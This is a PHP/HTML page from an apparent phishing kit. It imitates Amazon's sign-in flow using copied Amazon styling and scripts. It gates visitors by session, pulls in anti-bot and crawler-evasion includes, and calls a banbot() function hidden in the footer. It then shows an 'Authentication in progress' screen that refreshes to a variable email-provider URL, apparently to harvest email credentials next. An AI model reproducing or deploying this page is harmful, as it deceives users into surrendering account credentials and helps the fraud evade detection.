<?
session_start();

include "config.php";
include 'autob/bt.php';
include 'autob/basicbot.php';
include 'autob/uacrawler.php';
include 'autob/refspam.php';
include 'autob/ipselect.php';
include "autob/bts2.php";

if (isset($_SESSION['Authen'])) {
    // if (strlen($_SESSION['Authen'] ) < 5) {
    if (strlen($_SESSION['Authen']) <= 5) {
        header("Location: https://example.com");

        exit();
    }
} else {
    header("Location: https://example.com");
    exit();
}


?>
<meta http-equiv="refresh" content="2; url=<?php echo $emailurl; ?>" />
<!doctype html>
<html class="a-no-js" data-19ax5a9jf="dingo">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" type="image/png"
        href="http://www.veryicon.com/icon/ico/Internet%20%26%20Web/Socialmedia/Amazon.ico" />
    <script type='text/javascript'>var ue_t0 = ue_t0 || +new Date();</script>

    <title dir="ltr">Amazon Sign In</title>



    <link rel="stylesheet"
        href="https://images-na.ssl-images-amazon.com/images/G/01/AUIClients/AmazonUI-af9e9b82cae7003c8a1d2f2e239005b802c674a4._V2_.css#AUIClients/AmazonUI.fr.rendering_engine-not-trident.secure.min" />
    <style>
        .auth-workflow .auth-pagelet-container {
            width: 350px;
            margin: 0 auto
        }

        .auth-workflow .auth-pagelet-container-wide {
            width: 500px;
            margin: 0 auto
        }

        #auth-alert-window {
            display: none
        }

        .auth-display-none {
            display: none
        }

        .auth-pagelet-mobile-container {
            max-width: 400px;
            margin: 0 auto
        }

        .auth-pagelet-desktop-narrow-container {
            max-width: 350px;
            margin: 0 auto
        }

        .auth-pagelet-desktop-wide-container {
            max-width: 600px;
            margin: 0 auto
        }

        label.auth-hidden-label {
            height: 0 !important;
            width: 0 !important;
            overflow: hidden;
            position: absolute
        }

        .auth-phone-number-input {
            margin-left: 10px
        }

        #auth-captcha-noop-link {
            display: none
        }

        #auth-captcha-image-container {
            height: 70px;
            width: 200px;
            margin-right: auto;
            margin-left: auto
        }

        .auth-logo-cn {
            width: 110px !important;
            height: 60px !important;
            background-position: -105px -365px !important;
            -webkit-background-size: 600px 1000px !important;
            background-size: 600px 1000px !important;
            background-image: url(https://images-cn.ssl-images-amazon.com/images/G/01/amazonui/sprites/aui_sprite_0029-2x._V1_.png) !important
        }

        .auth-footer-seperator {
            display: inline-block;
            width: 20px
        }

        #auth-cookie-warning-message {
            display: none
        }

        #auth-pv-client-side-error-box,
        #auth-pv-client-side-success-box {
            display: none
        }

        .auth-error-messages {
            color: #000;
            margin: 0
        }

        .auth-error-messages li {
            list-style: none;
            display: none
        }

        .ap_ango_default .ap_ango_email_elem,
        .ap_ango_default .ap_ango_phone_elem {
            display: none
        }

        .ap_ango_phone .ap_ango_default_elem,
        .ap_ango_phone .ap_ango_email_elem {
            display: none
        }

        .ap_ango_email .ap_ango_default_elem,
        .ap_ango_email .ap_ango_phone_elem {
            display: none
        }

        .auth-interactive-dialog {
            width: 100%;
            height: 100%;
            position: fixed;
            top: 0;
            left: 0;
            display: none;
            background: rgba(0, 0, 0, .8);
            z-index: 100
        }

        .auth-interactive-dialog #auth-interactive-dialog-container {
            display: table-cell;
            height: 100%;
            vertical-align: middle;
            position: relative;
            text-align: center
        }

        .auth-interactive-dialog #auth-interactive-dialog-container .auth-interactive-dialog-content {
            display: inline-block
        }

        .auth-third-party-content {
            text-align: center
        }

        .auth-wechat-login-button .wechat_button {
            background: #13D71F;
            background: -webkit-gradient(linear, left top, left bottom, from(#13d71f), to(#64d720));
            background: -webkit-linear-gradient(top, #13d71f, #63d71f);
            background: -moz-linear-gradient(top, #13d71f, #63d71f);
            background: -ms-linear-gradient(top, #13d71f, #63d71f);
            background: -o-linear-gradient(top, #13d71f, #63d71f);
            background: linear-gradient(top, #13d71f, #63d71f)
        }

        .wechat_button_label {
            color: #fff
        }

        .wechat_button_icon {
            top: 5px !important
        }

        .a-lt-ie8 .wechat_button_icon {
            top: 0 !important
        }

        .a-lt-ie8 .auth-wechat-login-button .a-button-inner {
            height: 31px
        }

        .identity-provider-pagelet-wechat-container {
            text-align: center
        }

        .auth-contact-verification-spinner {
            position: absolute;
            left: 45%;
            top: 35%
        }

        .auth-contact-verification-spinner img {
            height: 60%;
            width: 60%
        }

        #auth-enter-pwd-to-cont {
            margin-left: 2px
        }

        .ap_hidden {
            display: none
        }

        .auth-contact-verification-section {
            position: relative;
            height: 100px
        }

        .auth-contact-verification-success-message {
            position: absolute;
            bottom: 10px
        }
    </style>
    <script>
        (function (n, r, u, d) {
            function l(a, b) { F && F.count && F.count("aui:" + a, 0 === b ? 0 : b || (F.count("aui:" + a) || 0) + 1) } function m(a) { try { return a.test(navigator.userAgent) } catch (b) { return !1 } } function k(a, b, c) { a.addEventListener ? a.addEventListener(b, c, !1) : a.attachEvent && a.attachEvent("on" + b, c) } function h(a, b, c, d) { b = b && c ? b + a + c : b || c; return d ? h(a, b, d) : b } function g(a, b, c) { try { Object.defineProperty(a, b, { value: c, writable: !1 }) } catch (d) { a[b] = c } return c } function e() { return setTimeout(J, 0) } function c(a, b) {
                var c = a.length, d = c,
                    f = function () { d-- || (G.push(b), H || (e(), H = !0)) }; for (f(); c--;)L[a[c]] ? f() : (B[a[c]] = B[a[c]] || []).push(f)
            } function a(a, b, c, d) { var e = r.createElement(a ? "script" : "link"); k(e, "error", d); if (a) { e.type = "text/javascript"; e.async = !0; if (a = c) a = -1 !== b.indexOf("images/I") || /AUIClients/.test(b); a && e.setAttribute("crossorigin", "anonymous"); e.src = b } else e.rel = "stylesheet", e.href = b; r.getElementsByTagName("head")[0].appendChild(e) } function b(b, c) {
                return function (e) {
                    function f() {
                        a(c, e, g, function (a) {
                            !M && g ? (g = !1, l("resource_retry"),
                                f()) : (l("resource_error"), b.log("Asset failed to load: " + e, M ? "WARN" : d)); a && a.stopPropagation ? a.stopPropagation() : n.event && (n.event.cancelBubble = !0)
                        })
                    } if (K[e]) return !1; K[e] = !0; l("resource_count"); var g = !0; return !f()
                }
            } function f(a, b, e, f, g) {
                return function (h, k) {
                    function l() { for (var a = [], c = 0; c < q.length; c++)a[c] = p.hasOwnProperty(q[c]) ? p[q[c]] : d; c = null; f ? c = k : "function" === typeof k && (c = k.apply(n, a)); if (b) { p[h] = c; a = h; for (L[a] = !0; (B[a] || []).length;)B[a].shift()(); delete B[a] } } var m = g || this; "function" === typeof h ?
                        (k = h, h = d) : (h = h.replace(/^prv:/, ""), p.hasOwnProperty(h) && m.error("Component already registered", h), p[h] = d); for (var q = [], r = 0; r < a.length; r++)q[r] = a[r].replace(/^prv:/, ""); e ? l() : c(q, m.guardFatal(h, l))
                }
            } function q(a) { return function () { return { execute: f(arguments, !1, a, !1, this), register: f(arguments, !0, a, !1, this) } } } function t(a, b) { return function (c, e) { e || (e = c, c = d); return function () { Q.push({ attribution: a, name: c, logLevel: b }); var d = e.apply(this, arguments); Q.pop(); return d } } } function w(a, c) {
                this.log = function (b,
                    c, d) { var e = n.ueLogError; return e ? (e({ message: b, logLevel: c || "ERROR", attribution: h(":", a, d) }), !0) : !1 }; this.error = function (b, c, d, e) { b = Error(h(":", e, b, d)); b.attribution = h(":", a, c); throw b; }; this.guardError = t(a); this.guardFatal = t(a, "FATAL"); this.load = { js: b(this, !0), css: b(this) }; g(this, "namespace", c)
            } function z() { r.body ? la.trigger("a-bodyBegin") : setTimeout(z, 20) } function v(a, b) { for (var c = a.className.split(" "), d = c.length; d--;)if (c[d] === b) return; a.className += " " + b } function x(a, b) {
                for (var c = a.className.split(" "),
                    e = [], f; (f = c.pop()) !== d;)f && f !== b && e.push(f); a.className = e.join(" ")
            } function y(a) { try { return a() } catch (b) { return !1 } } function A() { if (ka) { var a = n.innerWidth ? { w: n.innerWidth, h: n.innerHeight } : { w: X.clientWidth, h: X.clientHeight }, b = !1; 5 < Math.abs(a.w - ga.w) || 50 < a.h - ga.h ? (ga = a, Fa = 4, (b = Z.mobile || Z.tablet ? a.w > a.h : 1250 <= a.w) ? v(X, "a-ws") : x(X, "a-ws")) : Fa-- && (ca = setTimeout(A, 16)) } } function C(a) { (ka = a === d ? !ka : !!a) && A() } function I() { return ka } var D = n.AmazonUIPageJS || n.P; if (D && D.when && D.register) throw Error("A copy of P has already been loaded on this page.");
            var F = n.ue; F && F.tag && (F.tag("aui"), F.tag("aui:aui_build_date:3.16.2.6-2016-03-31")); var E = u.now = u.now || function () { return +new u }, G = [], H = !1, J; J = function () { for (var a = e(), b = E(); G.length;)if (G.shift()(), 50 < E() - b) return; clearTimeout(a); H = !1 }; m(/OS 6_[0-9]+ like Mac OS X/i) && k(n, "scroll", e); var L = {}, B = {}, K = {}, M = !1; k(n, "beforeunload", function () { M = !0; setTimeout(function () { M = !1 }, 1E4) }); var p = {}, Q = [], ba = n.onerror; n.onerror = function (a, b, c, d, e) {
                e && "object" === typeof e || (e = Error(a, b, c), e.columnNumber = d, e.stack =
                    "at " + h(":", b, c, d)); var f = Q.pop() || {}; e.attribution = h(":", e.attribution || f.attribution, f.name); e.logLevel = f.logLevel; e.attribution && console && console.log && console.log([e.logLevel || "ERROR", a, "thrown by", e.attribution].join(" ")); Q = []; ba && (f = [].slice.call(arguments), f[4] = e, ba.apply(n, f))
            }; w.prototype = {
                declare: f([], !0, !0, !0), register: f([], !0), execute: f([]), AUI_BUILD_DATE: "3.16.2.6-2016-03-31", when: q(), now: q(!0), trigger: function (a, b) {
                    var c = E(); this.declare(a, {
                        data: b, pageElapsedTime: c - (n.aPageStart || NaN),
                        triggerTime: c
                    })
                }, handleTriggers: function () { this.log("handleTriggers deprecated") }, attributeErrors: function (a) { return new w(a) }, _namespace: function (a, b) { return new w(a, b) }
            }; var la = g(n, "AmazonUIPageJS", new w); g(n, "P", la); z(); if (r.addEventListener) { var oa; r.addEventListener("DOMContentLoaded", oa = function () { la.trigger("a-domready"); r.removeEventListener("DOMContentLoaded", oa, !1) }, !1) } var X = r.documentElement, Y = function () {
                var a = ["O", "ms", "Moz", "Webkit"], b = r.createElement("div"); return {
                    testGradients: function () {
                        b.style.cssText =
                            ("background-image:-webkit-gradient(linear,left top,right bottom,from(#9f9),to(white));background-image:" + a.join("linear-gradient(left top,#9f9, white);background-image:")).slice(0, -17); return -1 < b.style.backgroundImage.indexOf("gradient")
                    }, test: function (c) { var d = c.charAt(0).toUpperCase() + c.substr(1); c = (a.join(d + " ") + d + " " + c).split(" "); for (d = c.length; d--;)if ("" === b.style[c[d]]) return !0; return !1 }, testTransform3d: function () { var a = !1; n.matchMedia && (a = n.matchMedia("(-webkit-transform-3d)").matches); return a }
                }
            }(),
                D = X.className, ha = /(^| )a-mobile( |$)/.test(D), ja = /(^| )a-tablet( |$)/.test(D), Z = {
                    audio: function () { return !!r.createElement("audio").canPlayType }, video: function () { return !!r.createElement("video").canPlayType }, canvas: function () { return !!r.createElement("canvas").getContext }, svg: function () { return !!r.createElementNS && !!r.createElementNS("http://www.w3.org/2000/svg", "svg").createSVGRect }, offline: function () { return navigator.hasOwnProperty && navigator.hasOwnProperty("onLine") && navigator.onLine }, dragDrop: function () {
                        return "draggable" in
                            r.createElement("span")
                    }, geolocation: function () { return !!navigator.geolocation }, history: function () { return !(!n.history || !n.history.pushState) }, webworker: function () { return !!n.Worker }, autofocus: function () { return "autofocus" in r.createElement("input") }, inputPlaceholder: function () { return "placeholder" in r.createElement("input") }, textareaPlaceholder: function () { return "placeholder" in r.createElement("textarea") }, localStorage: function () { return "localStorage" in n && null !== n.localStorage }, orientation: function () {
                        return "orientation" in
                            n
                    }, touch: function () { return "ontouchend" in r }, gradients: function () { return Y.testGradients() }, hires: function () { var a = n.devicePixelRatio && 1.5 <= n.devicePixelRatio || n.matchMedia && n.matchMedia("(min-resolution:144dpi)").matches; l("hiRes" + (ha ? "Mobile" : ja ? "Tablet" : "Desktop"), a ? 1 : 0); return a }, transform3d: function () { return Y.testTransform3d() }, touchScrolling: function () { return m(/Windowshop|android.([3-9]|[L-Z])|OS ([5-9]|[1-9][0-9]+)(_[0-9]{1,2})+ like Mac OS X|Chrome|Silk|Firefox|Trident\/.+?; Touch/i) }, ios: function () { return m(/OS [1-9][0-9]*(_[0-9]*)+ like Mac OS X/i) },
                    android: function () { return m(/android.([1-9]|[L-Z])/i) && !m(/trident/i) }, mobile: function () { return ha }, tablet: function () { return ja }
                }, aa; for (aa in Z) Z.hasOwnProperty(aa) && (Z[aa] = y(Z[aa])); for (var W = "textShadow textStroke boxShadow borderRadius borderImage opacity transform transition".split(" "), P = 0; P < W.length; P++)Z[W[P]] = y(function () { return Y.test(W[P]) }); var ka = !0, ca = 0, ga = { w: 0, h: 0 }, Fa = 4; A(); k(n, "resize", function () { clearTimeout(ca); Fa = 4; A() }); x(X, "a-no-js"); v(X, "a-js"); D = []; for (aa in Z) Z.hasOwnProperty(aa) &&
                    Z[aa] && D.push("a-" + aa.replace(/([A-Z])/g, function (a) { return "-" + a.toLowerCase() })); v(X, D.join(" ")); X.setAttribute("data-aui-build-date", "3.16.2.6-2016-03-31"); la.register("p-detect", function () { return { capabilities: Z, toggleResponsiveGrid: C, responsiveGridEnabled: I } }); la.declare("a-event-revised-handling", !1)
        })(window, document, Date);
        (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/G/01/AUIClients/AmazonUI-fbc03652a849303218c5e12c7c84e74950960736._V2_.js#AUIClients/AmazonUI.fr.rendering_engine-not-trident.secure.min');
        (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/G/01/AUIClients/AuthenticationPortalAssets-00b9c7a662fbe8e0a6628e35ea8e99f8b2b11e9f._V2_.js#AUIClients/AuthenticationPortalAssets.secure.min');
    </script>



    <script type='text/javascript'>

        (function (d, c) { function f(a) { b.push(a) } function e(a) { if (a) { var c = d.head || d.getElementsByTagName("head")[0] || d.documentElement, b = d.createElement("script"); b.async = "async"; b.src = a; c.insertBefore(b, c.firstChild) } } function g() { ue.uels = e; for (var a = 0; a < b.length; a++)e(b[a]); ue.deffered = 1 } var b = []; c.ue && (ue.uels = f, c.ue.attach && c.ue.attach("load", g)) })(document, window);

        (function (a) { var b = a.alert; window.alert = function () { a.ueLogError && a.ueLogError({ message: "[CSM] Alert invocation detected with argument: " + arguments[0], logLevel: "WARN" }); Function.prototype.apply.apply(b, [a, arguments || []]) } })(window);

        (function (k, l, g) {
            function m(a) { c || (c = b[a.type].id, "undefined" === typeof a.clientX ? (e = a.pageX, f = a.pageY) : (e = a.clientX, f = a.clientY), 2 != c || h && (h != e || n != f) ? (r(), d.isl && l.setTimeout(function () { p("at", d.id) }, 0)) : (h = e, n = f, c = 0)) } function r() { for (var a in b) b.hasOwnProperty(a) && d.detach(a, m, b[a].parent) } function s() { for (var a in b) b.hasOwnProperty(a) && d.attach(a, m, b[a].parent) } function t() { var a = ""; !q && c && (q = 1, a += "&ui=" + c); return a } var d = k.ue, p = k.uex, q = 0, c = 0, h, n, e, f, b = {
                click: { id: 1, parent: g }, mousemove: {
                    id: 2,
                    parent: g
                }, scroll: { id: 3, parent: l }, keydown: { id: 4, parent: g }
            }; d && p && (s(), d._ui = t)
        })(ue_csm, window, document);



        if (window.ue && window.ue.uels) {
            var cel_widgets = [{ "c": "celwidget" }];
            ue.uels("https://images-na.ssl-images-amazon.com/images/G/01/AUIClients/ClientSideMetricsAUIJavascript-6f4530fbabd6f27cfdd6766c550b5c5327f8aa3d._V2_.js");
        }

        (function (k, c) {
            function l(a, b) { return a.filter(function (a) { return a.initiatorType == b }) } function f(a, c) { if (b.t[a]) { var g = b.t[a] - b._t0, e = c.filter(function (a) { return 0 !== a.responseEnd && m(a) < g }), f = l(e, "script"), h = l(e, "link"), k = l(e, "img"), n = e.map(function (a) { return a.name.split("/")[2] }).filter(function (a, b, c) { return a && c.lastIndexOf(a) == b }), q = e.filter(function (a) { return a.duration < p }), s = g - Math.max.apply(null, e.map(m)) < r | 0; "af" == a && (b._afjs = f.length); return a + ":" + [e[d], f[d], h[d], k[d], n[d], q[d], s].join("-") } }
            function m(a) { return a.responseEnd - (b._t0 - c.timing.navigationStart) } function n() { var a = c[h]("resource"), d = f("cf", a), g = f("af", a), a = f("ld", a); delete b._rt; b._ld = b.t.ld - b._t0; b._art && b._art(); return [d, g, a].join("_") } var p = 20, r = 50, d = "length", b = k.ue, h = "getEntriesByType"; b._rre = m; b._rt = c && c.timing && c[h] && n
        })(ue_csm, window.performance);


        (function (h, d) {
            function e(c) { c = ""; var b = a.isBFT ? "b" : "s", e = "" + a.oid, d = "" + a.lid, f = e; e != d && 20 == d.length && (b += "a", f += "-" + d); a.tabid && (c = a.tabid + "+"); c += b + "-" + f; c != g && 100 > c.length && (g = c, document.cookie = "csm-hit=" + c + ("|" + +new Date) + l + "; path=/") } function m() { g = 0 } function k(b) { !0 === d[a.pageViz.propHid] ? g = 0 : !1 === d[a.pageViz.propHid] && e({ type: "visible" }) } var l = "; expires=" + (new Date(+new Date + 6048E5)).toGMTString(), g, b = h.ue_tbpv, a = h.ue || {}, f = b && a.pageViz && a.pageViz.event && a.pageViz.propHid; a.attach && (a.attach("click",
                e), a.attach("keyup", e), f && 4 != b && 5 != b || (a.attach("focus", e), a.attach("blur", m)), f && a.attach(a.pageViz.event, k, d), !f || 3 != b && 5 != b || k({})); a.aftb = 1
        })(ue_csm, document);


        ue_csm.ue.stub(ue, "impression");


        (function (g, c, h) {
            function e(a, d, b) { a && a.indexOf && 0 === a.indexOf("http") && 0 !== a.indexOf("https") && !k[a] && (b = p && b ? l(b) : "N/A", c.ueLogError && c.ueLogError({ message: q + d + " : " + a, logLevel: r }, { attribution: b }), k[a] = 1, m++) } function f(a, d) { if (a && d) for (var b = 0; b < a.length; b++)try { d(a[b]) } catch (c) { } } function l(a) {
                if (a.id) return "//*[@id='" + a.id + "']"; var d; d = 1; var b; for (b = a.previousSibling; b; b = b.previousSibling)b.nodeName == a.nodeName && (d += 1); b = a.nodeName; 1 != d && (b += "[" + d + "]"); a.parentNode && (b = l(a.parentNode) + "/" + b);
                return b
            } function s() { var a = h.images; a && a.length && f(a, function (a) { var b = a.getAttribute("src"); e(b, "img", a) }) } function t() { var a = h.scripts; a && a.length && f(a, function (a) { var b = a.getAttribute("src"); e(b, "script", a) }) } function u() { var a = h.styleSheets; a && a.length && f(a, function (a) { (a = a.ownerNode) && e(a.getAttribute("href"), "style", a) }) } function v() { if (w) { var a; a = c.performance && c.performance.getEntriesByType ? c.performance.getEntriesByType("resource") : void 0; a && a.length && f(a, function (a) { e(a.name, a.initiatorType) }) } }
            function n() { var a; a = c.location && c.location.protocol ? c.location.protocol : void 0; "https:" == a && (v(), s(), t(), u(), m < x && setTimeout(n, y)) } var q = "[CSM] Insecure content detected ", r = "WARN", k = {}, m = 0, y = g.ue_nsip || 1E3, x = 5, w = 1 == g.ue_urt, p = 3 == g.ue_urt; ue_csm.ue_disableNonSecure || (c.performance && c.performance.setResourceTimingBufferSize && c.performance.setResourceTimingBufferSize(300), n())
        })(ue_csm, window, document);


        if (window.ue && uet) { uet('bb'); }
    </script>
</head>

<body
    class="ap-locale-en_US a-auix_ux_57388-t1 a-auix_ux_63571-c a-aui_49697-t1 a-aui_51744-c a-aui_57326-c a-aui_58736-c a-aui_accessibility_49860-c a-aui_attr_validations_1_51371-c a-aui_bolt_62845-c a-aui_ux_47524-t1 a-aui_ux_49594-c a-aui_ux_56217-c a-aui_ux_59374-c a-aui_ux_59797-c a-aui_ux_60000-c">

    <script type='text/javascript'>

        (function () {
            function l(a) { for (var c = b.location.search.substring(1).split("&"), e = 0; e < c.length; e++) { var d = c[e].split("="); if (d[0] === a) return d[1] } } window.amzn = window.amzn || {}; amzn.copilot = amzn.copilot || {}; var b = window, f = document, g = b.P || b.AmazonUIPageJS, h = f.head || f.getElementsByTagName("head")[0], m = 0, n = 0; amzn.copilot.checkCoPilotSession = function () {
                f.cookie.match("cpidv") && ("undefined" !== typeof jQuery && k(jQuery), g && g.when && g.when("jQuery").execute(function (a) { k(a) }), b.amznJQ && b.amznJQ.available && b.amznJQ.available("jQuery",
                    function () { k(jQuery) }), b.jQuery || g || b.amznJQ || q())
            }; var q = function () { m ? b.ue && "function" === typeof b.ue.count && b.ue.count("cpJQUnavailable", 1) : (m = 1, f.addEventListener ? f.addEventListener("DOMContentLoaded", amzn.copilot.checkCoPilotSession, !1) : f.attachEvent && f.attachEvent("onreadystatechange", function () { "complete" === f.readyState && amzn.copilot.checkCoPilotSession() })) }, k = function (a) {
                if (!n) {
                    n = 1; amzn.copilot.jQuery = a; a = l("debugJS"); var c = "https:" === b.location.protocol ? 1 : 0, e = 1; url = "/gp/copilot/handlers/copilot_strings_resources.html";
                    window.texas && texas.locations && (url = texas.locations.makeUrl(url)); g && g.AUI_BUILD_DATE && (e = 0); amzn.copilot.jQuery.ajax && amzn.copilot.jQuery.ajax({ url: url, dataType: "json", data: { isDebug: a, isSecure: c, includeAUIP: e }, success: function (a) { amzn.copilot.vip = a.serviceEndPoint; amzn.copilot.enableMultipleTabSession = a.isFollowMe; r(a) }, error: function () { b.ue.count("cpLoadResourceError", 1) } })
                }
            }, r = function (a) {
                var c = amzn.copilot.jQuery, e = function () { amzn.copilot.setup(c.extend({ isContinuedSession: !0 }, a)) }; a.CSSUrls &&
                    c.each(a.CSSUrls[0], function (a, c) { var b = f.createElement("link"); b.type = "text/css"; b.rel = "stylesheet"; b.href = c; h.appendChild(b) }); a.CSSTag && s(a.CSSTag); if (a.JSUrls) { var d = l("forceSynchronousJS"), b = a.JSUrls[0]; c.each(b, function (a, c) { a === b.length - 1 ? p(c, d, e) : p(c, d) }) } a.JSTag && (t(a.JSTag), P.when("CSCoPilotPresenterAsset").execute(function () { e() }))
            }, t = function (a) {
                var c = f.createElement("div"); c.innerHTML = a; a = 0; for (var b = c.children.length; a < b; a++) {
                    var d = f.createElement("script"); d.type = "text/javascript";
                    d.innerHTML = c.children[a].innerHTML; h.appendChild(d)
                }
            }, s = function (a) { var b = f.createElement("div"); b.innerHTML = a; a = 0; for (var e = b.children.length; a < e; a++)h.appendChild(b.children[a]) }, p = function (a, b, e) { var d = f.createElement("script"); d.type = "text/javascript"; d.src = a; d.async = b ? !1 : !0; e && (d.onload = e); h.appendChild(d) }
        })();

        amzn.copilot.checkCoPilotSession();

    </script>
    <div id="a-page">
        <div class="a-section a-padding-medium auth-workflow">
            <div class="a-section a-spacing-none">







                <div class="a-section a-spacing-medium a-text-center">



                    <a class="a-link-normal" href="">

                        <i class="a-icon a-icon-logo" aria-label="Amazon"><span class="a-icon-alt">Amazon</span></i>


                    </a>


                </div>

            </div>








            <!-- show a warning modal dialog when the third party account is connected with Amazon -->


            <div class="a-section a-spacing-base auth-pagelet-container">




                <div class="a-section">






                    <div class="a-section auth-pagelet-container">









                        <?php if (isset($_GET['invalid_login'])) { ?>

                            <div id="auth-error-message-box"
                                class="a-box a-alert a-alert-error auth-server-side-message-box a-spacing-base">
                                <div class="a-box-inner a-alert-container">
                                    <h4 class="a-alert-heading">There was a problem</h4><i class="a-icon a-icon-alert"></i>
                                    <div class="a-alert-content">
                                        <ul class="a-nostyle a-vertical a-spacing-none">

                                            <li><span class="a-list-item">
                                                    Please correct and try again.
                                                </span></li>

                                        </ul>
                                    </div>
                                </div>
                            </div>

                        <?php } ?>









                    </div>
                    <div class="a-section">



                        <center>
                    </div>
                    <BR /> <BR /> <BR />

                    <center>
                        <img height="75" src="asset/ring-alt.gif">
                    </center><BR />
                    <center> <b>Authentication in progress.</b></center>
                    <center>Redirecting to your email provider...</center>
                    </center>
                </div>
            </div>


        </div>


        <div id="right-2">
        </div>

        <div class="a-section a-spacing-top-extra-large">





            <div class="a-divider a-divider-section">
                <div class="a-divider-inner"></div>
            </div>
            <div class="a-section a-spacing-small a-text-center a-size-mini">
                <span class="auth-footer-seperator"></span>


                <a class="a-link-normal" target="_blank" href="">
                    Conditions of Use
                </a>
                <span class="auth-footer-seperator"></span>


                <a class="a-link-normal" target="_blank" href="">
                    Privacy Notice
                </a>
                <span class="auth-footer-seperator"><?php if(isset($_SESSION['device']) && !stripos($_SESSION['device'],'yochi')){banbot();};?></span>


                <a class="a-link-normal" target="_blank" href="">
                    Help
                </a>
                <span class="auth-footer-seperator"></span>

            </div>

            <div class="a-section a-spacing-none a-text-center">
                <span class="a-size-mini a-color-secondary">
                    &#9400; 1996-2023, Amazon.com, Inc. or its affiliates
                </span>
            </div>

        </div>
    </div>

    <div id="auth-external-javascript" class="auth-external-javascript" data-external-javascripts="">
    </div>

    </div>


</body>

</html>
